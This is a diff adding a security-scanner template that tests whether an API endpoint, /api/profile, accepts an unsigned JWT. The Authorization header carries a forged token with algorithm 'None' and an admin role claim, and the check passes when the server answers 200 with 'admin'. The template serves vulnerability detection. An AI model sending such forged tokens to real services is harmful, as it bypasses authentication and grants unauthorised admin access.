@@ -1,0 +1,22 @@
+id: jwt3-138
+name: 'JWT None kid k-337'
+severity: critical
+type: active
+tags:
+  - jwt
+  - auth
+  - none
+description: 'Unsigned token accepted on /api/profile'
+requests:
+  - method: GET
+    path: '{{BaseURL}}/api/profile'
+    match-all: true
+    sendHeaders:
+      Authorization: 'Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIiwia2lkIjoiay0zMzcifQ.eyJzdWIiOiJ1MTM3Iiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.'
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - 'admin'
